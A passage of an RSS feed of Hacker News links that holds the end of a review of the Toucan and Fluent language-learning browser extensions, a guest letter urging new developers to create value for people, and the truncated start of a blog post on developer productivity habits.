<div><figure><img data-attachment-id="962" data-permalink="https://hulry.com/toucan-learn-language/toucan-language-packs/" data-orig-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?fit=1860%2C1182&amp;ssl=1" data-orig-size="1860,1182" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="toucan-language-packs" data-image-description="" data-medium-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?fit=300%2C191&amp;ssl=1" data-large-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?fit=1024%2C651&amp;ssl=1" loading="lazy" width="1024" height="651" src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=1024%2C651&amp;ssl=1" alt="Selecting language packs in Toucan." srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=1024%2C651&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=300%2C191&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=768%2C488&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=1536%2C976&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=1200%2C763&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?w=1860&amp;ssl=1 1860w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=1024%2C651&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=300%2C191&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=768%2C488&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=1536%2C976&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=1200%2C763&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?w=1860&amp;ssl=1 1860w" data-lazy-src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=1024%2C651&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Selecting language packs in Toucan.</figcaption></figure></div>



<p>Each language pack has a set of words that Toucan will search for in an article or web page content and translate.</p>



<p>For example, choosing the language pack “Get Around the City” will set Toucan to translate the following English words in the collection to their Spanish counterparts:</p>



<div><figure><img data-attachment-id="964" data-permalink="https://hulry.com/toucan-learn-language/toucan-get-around-city-pack/" data-orig-file="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?fit=1420%2C834&amp;ssl=1" data-orig-size="1420,834" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="toucan-get-around-city-pack" data-image-description="" data-medium-file="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?fit=300%2C176&amp;ssl=1" data-large-file="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?fit=1024%2C601&amp;ssl=1" loading="lazy" width="1024" height="601" src="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=1024%2C601&amp;ssl=1" alt="Toucan's &quot;Get Around the City&quot; language pack." srcset="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=1024%2C601&amp;ssl=1 1024w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=300%2C176&amp;ssl=1 300w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=768%2C451&amp;ssl=1 768w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=1200%2C705&amp;ssl=1 1200w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?w=1420&amp;ssl=1 1420w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=1024%2C601&amp;ssl=1 1024w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=300%2C176&amp;ssl=1 300w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=768%2C451&amp;ssl=1 768w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=1200%2C705&amp;ssl=1 1200w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?w=1420&amp;ssl=1 1420w" data-lazy-src="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=1024%2C601&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Toucan’s “Get Around the City” language pack.</figcaption></figure></div>



<p>This feature is beneficial for beginners because we can choose a handful of language packs and start learning.</p>



<p>Once we have mastered the words in the selected packs, we can remove them from our list and move on to more advanced packs.</p>



<p>So, overall, Toucan seems to be a useful tool for learning a language.</p>



<p>But, here’s a burning question:</p>



<h2>Can language extensions be a distraction?</h2>



<p>It depends on the translation density set for the extension.</p>



<p>For example, in Toucan, we can control the number of translations on a page with the following setting:</p>



<div><figure><img data-attachment-id="967" data-permalink="https://hulry.com/toucan-learn-language/toucan-translation-frequency/" data-orig-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?fit=1600%2C1158&amp;ssl=1" data-orig-size="1600,1158" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="toucan-translation-frequency" data-image-description="" data-medium-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?fit=300%2C217&amp;ssl=1" data-large-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?fit=1024%2C741&amp;ssl=1" loading="lazy" width="1024" height="741" src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=1024%2C741&amp;ssl=1" alt="Choosing a translation density in Toucan." srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=1024%2C741&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=300%2C217&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=768%2C556&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=1536%2C1112&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=1200%2C869&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?w=1600&amp;ssl=1 1600w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=1024%2C741&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=300%2C217&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=768%2C556&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=1536%2C1112&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=1200%2C869&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?w=1600&amp;ssl=1 1600w" data-lazy-src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=1024%2C741&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Choosing a translation density in Toucan.</figcaption></figure></div>



<p>Choosing “Many” will set Toucan to replace and highlight a substantial number of words on the page with their translated counterparts.</p>



<p>I tried this setting for some time, and I found it somewhat distracting because there were a ton of words highlighted in the page fighting for my attention.</p>



<p>To take it easy and progress gradually, I started with the setting “Less”.</p>



<p>With “Less”, I get around 5–7 words translated in an article of 4–5 min read time.</p>



<p>Also:</p>



<p>With “Less” translations are distributed evenly in the article. Thus, the highlights don’t steal my attention from the content.</p>



<p>I can naturally spot a highlight as I read through the content, and hover on the translated word for the meaning.</p>



<p>Here’s what I recommend:</p>



<p>Start with “Less” → As you become comfortable with the translations → Move to “More”.</p>



<p>With a gradual transition, it’ll be easier to stick to this extension and interpret it as a tool instead of a distraction.</p>



<p>Similar to Toucan, Fluent also shows up an option to choose how many words you’d like to see translated:</p>



<div><figure><img data-attachment-id="992" data-permalink="https://hulry.com/toucan-learn-language/fluent-set-word-density/" data-orig-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?fit=1584%2C662&amp;ssl=1" data-orig-size="1584,662" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fluent-set-word-density" data-image-description="" data-medium-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?fit=300%2C125&amp;ssl=1" data-large-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?fit=1024%2C428&amp;ssl=1" loading="lazy" width="1024" height="428" src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=1024%2C428&amp;ssl=1" alt="Setting a translation density on Fluent." srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=1024%2C428&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=300%2C125&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=768%2C321&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=1536%2C642&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=1200%2C502&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?w=1584&amp;ssl=1 1584w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=1024%2C428&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=300%2C125&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=768%2C321&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=1536%2C642&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=1200%2C502&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?w=1584&amp;ssl=1 1584w" data-lazy-src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=1024%2C428&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Setting a translation density on Fluent.</figcaption></figure></div>



<p>Establishing the fact that these extensions are a tool rather than a distraction, here’s another critical question:</p>



<h2>Are there any privacy concerns?</h2>



<p>Privacy is a significant factor in an extension like this since we’re giving the extension full access to whatever we browse.</p>



<p>Both <a href="https://jointoucan.com/privacy" target="_blank" rel="noreferrer noopener nofollow">Toucan</a> and <a href="https://www.usefluent.co/privacy" target="_blank" rel="noreferrer noopener nofollow">Fluent</a> have addressed this concern with a friendly privacy policy.</p>



<p>Here’s a gist:</p>



<ul><li>They don’t sell user data for ads.</li><li>The extensions don’t store any browsing history.</li><li>They only store the translated words in a browsing session to keep track of your learning progress.</li></ul>



<p>But:</p>



<p>With a free product, there will always be privacy concerns, no matter how clean it’s privacy policy might be. The business needs to make money.</p>



<p>Here’s how Toucan generates revenue right now:</p>



<ul><li><strong>Premium memberships.</strong> Toucan offers a premium membership which unlocks a couple of advanced learning packs.</li><li><strong>Own a word.</strong> With Toucan, you can <a href="https://jointoucan.com/own-the-word/claim" target="_blank" rel="noreferrer noopener nofollow">own a word</a> for <strong>$0.99/week</strong>. This means that if I own the word “productivity”, then every time someone hovers over the translated word for “productivity”, they’ll see my name and website at the bottom of the card. Consider it a form of advertisement without the use of your browsing history.</li></ul>



<p>That said:</p>



<p>I would still recommend you turn off Toucan on sensitive websites like your email inbox, banking sites, etc.</p>



<p>Here’s how you can do it:</p>



<div><figure><img data-attachment-id="975" data-permalink="https://hulry.com/toucan-learn-language/turn-off-toucan/" data-orig-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/turn-off-toucan.gif?fit=840%2C526&amp;ssl=1" data-orig-size="840,526" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="turn-off-toucan" data-image-description="" data-medium-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/turn-off-toucan.gif?fit=300%2C188&amp;ssl=1" data-large-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/turn-off-toucan.gif?fit=840%2C526&amp;ssl=1" loading="lazy" width="840" height="526" src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/turn-off-toucan.gif?resize=840%2C526&amp;ssl=1" alt="Turning off Toucan translations on a specific website." data-recalc-dims="1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Turning off Toucan translations on a specific website.</figcaption></figure></div>



<p>Once Toucan is turned off for a particular website, the extension will never read any data from any page of the website.</p>



<p>Here are some of the websites where I have disabled Toucan:</p>



<ul><li>HEY email</li><li>Dropbox</li><li>Gmail</li><li>Banking websites I use</li><li>WordPress</li><li>Notion</li></ul>



<p>It’s always wise to fine-tune privacy settings so that we don’t leak any of our data to a company who might use it to their advantage.</p>



<p>Now that we talked about Toucan’s premium subscription, let’s see:</p>



<h2>Whether premium is worth the money</h2>



<p>Right now, the only selling point of …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hulry.com/toucan-learn-language/">https://hulry.com/toucan-learn-language/</a></em></p>]]>
            </description>
            <link>https://hulry.com/toucan-learn-language/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25055257</guid>
            <pubDate>Wed, 11 Nov 2020 03:39:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Create Value for People]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25055070">thread link</a>) | @mooreds
<br/>
November 10, 2020 | https://letterstoanewdeveloper.com/2020/11/09/create-value-for-people/ | <a href="https://web.archive.org/web/*/https://letterstoanewdeveloper.com/2020/11/09/create-value-for-people/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p><em>This is a guest post from Minh Pham. Enjoy.</em></p>



<p>Dear new developer,</p>



<p>I want to start off by saying Congrats and Good job. If you’re reading this, it’s likely you know how to code – and even if you’re still working on getting that first job, that means you have one of the most desirable skill sets in the world today. I congratulate you because getting here took work. You weren’t born with this knowledge, and even if you felt like it came naturally, it was still a journey of discovery, learning, and practice that got you where you are today.</p>



<p>As you look towards your first job – I want to offer you a single piece of advice that may act as your career’s guiding north star:</p>



<p><strong>Create Value for People.</strong></p>



<p>When you have the power to create anything, you begin to realize the importance isn’t on the code you’re writing but rather why you’re writing it in the first place. What value are you creating through your skill? This is why companies hire people like yourself. They are seeking out individuals who can ultimately deliver value to their customers, particularly through software. As you mature, you will realize that much of engineering has little to do with how fancy your solution is, and instead has everything to do with what problem it solves for the user. Once you accept this, you’ll begin to see that discussions of tech choice and code structure rarely matters outside the context of what business value it represents.</p>



<p>This is where your focus should stay.</p>



<p>Obsessions with patterns and algorithms don’t serve anyone’s mission by themselves. Ignore the constant pressure to assert yourself through syntactic cleverness and obscure trivia. These things don’t matter. These things don’t drive value for anyone. No matter how many “experienced” engineers tell you these are important, I promise you no company hires people simply for them to recite principles and algorithms.</p>



<p>While coding might be your latest skill set, it is by no means an engineer’s only skillset. Remember that at the end of the day, it doesn’t matter if your code is ugly, fancy, verbose or concise – the value you create matters. Strive to be an excellent communicator, a quality teammate, and an outstanding human. These attributes will guide your engineering efforts to ensure you bring value.</p>



<p>No matter where your career goes, if you focus on creating value for people, opportunities will never be in short supply. Desire for specific skills may rise and fall, but people will always look to those who can create value.</p>



<p>With that, I wish you the best of luck and may our journeys cross again,</p>



<p>Minh Pham</p>



<p><em><a href="https://www.linkedin.com/in/miniseagoat/">Minh Pham</a> believes you should lead how you want to be led. This has been the guiding principle of his career since he started. As an Engineer, he always wished he had someone who would guide him – telling him what’s important, what he has to work on, and what he should ignore. Having gone through all that and then some, Minh now looks to be the positive influence he wishes he had.</em></p>



<p><em>As a manager, Minh’s greatest passion was teaching people the skills to create and drive the careers they want to have. Now as a career coach, he works to show people they have the power to build the life they want.</em></p>



<p><em>Minh believes anyone can do it – and he promises it doesn’t involve linked lists or graph traversals.</em></p>
	</div><div>
			<!-- .entry-auhtor -->
		<p><strong>Published</strong>
			<time datetime="2020-11-09T09:27:00-07:00">November 9, 2020</time><time datetime="2020-10-23T21:27:22-06:00">October 23, 2020</time>		</p><!-- .site-posted-on -->
	</div></div>]]>
            </description>
            <link>https://letterstoanewdeveloper.com/2020/11/09/create-value-for-people/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25055070</guid>
            <pubDate>Wed, 11 Nov 2020 03:00:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Helped me be more Productive as a Software Developer]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25054231">thread link</a>) | @strikingloo
<br/>
November 10, 2020 | https://www.datastuff.tech/programming/productivity-software-developer-student/ | <a href="https://web.archive.org/web/*/https://www.datastuff.tech/programming/productivity-software-developer-student/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-884" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">
<div>

<div itemprop="text">

<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@strikingloo">
<meta name="twitter:title" content="How I Stay Productive as a Software Developer">
<meta name="twitter:description" content="Imagine getting more stuff done, more effectively, in less time.">
<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2020/11/04/19/22/windmill-5713337_1280.jpg">
<p>Imagine getting more stuff done, more effectively, in less time. That is how I will define productivity for the rest of this piece.</p>
<p>I’ve been reading a lot of productivity articles, tips, tricks and Twitter threads. In a way, doing so is the worst kind of procrastination, entropy for entropy’s sake. But every once in a while you’ll glean some gold nugget among the rubble, and it will all be worth it.</p>
<p>This is my attempt at recollecting what nuggets I found. On each section I will:</p>
<ul><li>Cite sources I found interesting or relevant.</li><li>Mention whether the methods have worked for me and what exact impact they’ve had.</li></ul>
<p>I will add a big caveat though: I think every person’s optimal productivity engine should be different. Thus, all of this advice should be taken, tested, and left to rot if it doesn’t work for you. And that pretty much applies to all other posts of this kind, in any blog ever, in my opinion.</p>
<p>Without further ado, here are the things I’ve seen actually work to make me get more stuff done, or stay less stressed.</p>
<h2>Reduce cognitive load</h2>
<p>Cognitive load is a beautiful term. It roughly means “How full is your mind’s RAM?”. </p>
<p>Whenever you’re thinking of the next 5 things you have to do, your groceries list, and whether you left the stove on, you’re carrying cognitive load.</p>
<p>It should be evident, but cognitive load stresses you out. Reducing it can help you better focus on your task.</p>
<p>Here’s what has worked for me on this account:</p>
<ul><li>Keep a clean room, office and desk<sup><a href="#fn1">1</a></sup>. You shouldn’t have trouble finding anything you use often, and the things you use the most often should be very easy to reach. This also applies to your filesystem, bookmarks system, etc. If you know you’ll want to check a certain link again in the future, bookmark it under an intuitive path. Don’t find yourself looking for it through your twitter feed.</li><li>If something’s on your mind and it’s not useful to keep thinking of it, <strong>write it down and forget it</strong>. You can look it up later. </li></ul>
<p>Take this article, for instance: instead of pestering myself thinking ‘You have to write that article!’ I just added an item on my Trello backlog that said ‘article on productivity’ and forgot about it until I had free time again and checked.</p>
<p>My own setup for task tracking is a combination of Trello for daily/weekly tasks and a Google sheet for long term stuff -like a deferred backlog- but really, every person has their own perfect combination of tools and processes. Find your own. </p>
<p>I know many people who prefer physical post-its, or a board. I’d rather get the portability of a browser app and the tracking for future reference. This is especially good if you also practice journaling, because then it’s just “What did I do today? Oh ok I’ll check today’s cards”. Still, your mileage will vary, so try many things and see what works best for you.</p>
<h2>Keep productive habits</h2>
<blockquote><p>…Watch your actions, they become your habits; watch your habits, they become your character; watch your character, it becomes your destiny.”</p><cite><em>―&nbsp;</em><strong>Lao Tzu</strong></cite></blockquote>
<p>Some people recommend this book called “Atomic Habits”. I won’t lie, I haven’t read it. But I read a good summary on reddit and agree with most of it, thought I was already kind of doing most of what it talks about.</p>
<p>The gist of it is: don’t try to build productivity on its own, build systems that incentivize you to be productive.</p>
<p>Some people use pomodoros, others prefer to put on noise-blocking headphones; I personally prefer to hide my cell phone until I have got enough stuff done. </p>
<p>My technique for this is simple: every month, (or use whatever time frame works for you), I decide which routines I will keep.</p>
<p>Right now for instance, my routines are:</p>
<ul><li>Exercise 4 times a week.</li><li>Do everything I have to for work and school, obviously.</li><li>Journal every night</li><li>2 hours of Japanese study every day</li></ul>
<p>The painful side of having a very clear set of goals and habits is: you’re extremely accountable to them. Is the day ending and you haven’t done your daily study session? You better get down to it right now. </p>
<p>In my case, my own conscience is a harsh enough mistress, but if you are not that hard on yourself when your to-do lists have uncrossed items, you may want to try something like </p>
<ul><li>Asking your SO to make passive aggressive remarks to you if you don’t finish your tasks.</li><li>Reward yourself with something sweet.</li><li>Going full monk-mode and forfeiting cell phone time until everything is done.</li></ul>
<p>Now for the flip side: you’re accountable for your tasks, yes, but you also set them. So whenever you define what your habits will be, don’t overestimate yourself. It’s better to have realistic, achievable goals that fall a bit short of your <em>maximum effort</em>, than it is to overstep, burn out or just not build the habits because you can’t keep up with them. </p>
<p>Did you underestimate your time management skills and now you’re doing everything you planned for <em>and</em> then get a lot of free time anyway? Cool! You get to feel productive <em>and</em> have free time. </p>
<p>You definitely don’t want to optimize for minimum free time. It sounds obvious, but I’ve caught myself and others doing this without realizing it.</p>
<p>The devil doesn’t always make work with idle hands.</p>
<p>Another thing about incentives: this ties to the “unclutter” rule I mentioned earlier, but do try to turn everything around you into a big <strong>habit-keeping engine</strong>. </p>
<p>For instance, if your goal is to read a book every week, have your book on sight and within arm’s reach at all times. Carry it on your suitcase/backpack, take it out instead of your cell phone when you want to procrastinate, etc. </p>
<p>You’ll be surprised by how much stuff you get done when <strong>everything around you is making you do it</strong>.</p>
<p>For a small guide on creating habits that I found interesting (though maybe more complicated than necessary) see <a href="https://www.lesswrong.com/posts/vE7Z2JTDo5BHsCp4T/instrumental-rationality-4-2-creating-habits">creating habits</a>.</p>
<h2>Don’t use your head for things a PC was made for</h2>
<p>Really though, remember what I said about cognitive load? Defining daily goals is not cool if you end up spending 5 minutes every hour thinking “ok what comes next? I already crossed my Chinese practice and my Economics lecture, what was the next item?”. </p>
<p>You want whatever system you build to be maintainable in the long run, so you should make it as easy to consult as possible, and not depend on a very fallible piece of architecture (your head).</p>
<p>So keep everything written down, on a nice .txt file, a Google doc, a sheet, etc. Use whatever you like, but not your head. Really it’s that simple, and it works. </p>
<p>(Aside: I am not going into detail into different tools or task tracking systems because honestly? There are like 20 different articles on this topic posted on HackerNews every week, and they’re all the same).</p>
<h2>Effective Note Taking</h2>
<p>This is all I have to say about note taking.</p>
<p>I am not a very note taking inclined person. I started this particular habit this year, and even though it <em>feels</em> productive, I don’t feel like I can quite say it has actually made me perform better yet.</p>
<p>So my first tip on this will be: <strong>don’t take notes if you don’t think it will be worth it</strong>. Some people retain information better when they take notes, I am not one of those people but if you are, then that piece of advice doesn’t apply to you. Remember when I said systems needed to be custom?</p>
<p>I also say this because I see there’s this trend in the internet of “write everything down, take all the notes!” and I think we’re tending towards an excessive “pro-notes-taking” bias, which may be unwarranted.</p>
<p>Secondly: if you are not writing everything down, how do you decide what should be kept? Well, I’m open to better ideas, but in my case I optimize for (estimated) <strong>future searchability</strong>: is what I just read, heard or watched something I am <strong>likely to think of in the future</strong>? And maybe I will want to recall it exactly and won’t be able to? Well then, into the notes it goes.</p>
<p>Note that it doesn’t need to be a relevant piece of information per se. I take notes about interesting history facts, anime trivia and weird Japanese words, not because they’ll come up in my final exams (fingers crossed) or, gods forbid, my job. I keep those quotes and facts around because they may come up in conversation.</p>
<p>Generally though, I think the category that makes the best notes is “things that I am likely to forget and look up again in the future, but I don’t care to learn by heart right now”. </p>
<p>This includes things like very specific facts about a domain, convoluted bash commands that you put into a script to not have to remember again (but want to persist somewhere else in case you want them on a different pc), or syntax details in a programming language.</p>
<p>I will be reading an article and think “oh, $FRIEND_X surely would find this very funny” and just write it down. And then I may send it to them through IM, but let’s be honest I could forget… until I reread my notes in the future.</p>
<p>Oh, the topic of rereading notes. This one is a tricky bit I haven’t mastered yet, and I am also open to suggestions in this area. Personally, I only reread notes on technical topics whenever they come up and I want to refresh my memory, and any other topic if I am thinking of it.</p>
<p>I know some people like to go through all of their notes every X time and they say it improves their creativity and gets the writing juices flowing. I am not super concerned about my creativity or writing right now (in case my one year posting-gap didn’t make that clear), but I will definitely experiment with that in the future (and write about it if I get any relevant results).</p>
<p>Lastly, I’ve recently been using a <strong>personal wiki</strong> for some of my notes (only the polished, public-facing ones), and it’s really cool, but it just reinforces point one: I feel like part of why I use a personal wiki is just that it feels nice, and I haven’t yet seen a lot of improvement over a simple Evernote or Google Docs. Maybe it’s a matter of scale and the effects won’t be apparent until a few years in? We will see.</p>
<h2>Anki and SRS for studying and productivity.</h2>
<blockquote><p><strong>Anki makes memory a choice</strong>, rather than a haphazard event, to be left to chance.</p><cite>Michal …</cite></blockquote></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.datastuff.tech/programming/productivity-software-developer-student/">https://www.datastuff.tech/programming/productivity-software-developer-student/</a></em></p>]]>
            </description>
            <link>https://www.datastuff.tech/programming/productivity-software-developer-student/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25054231</guid>
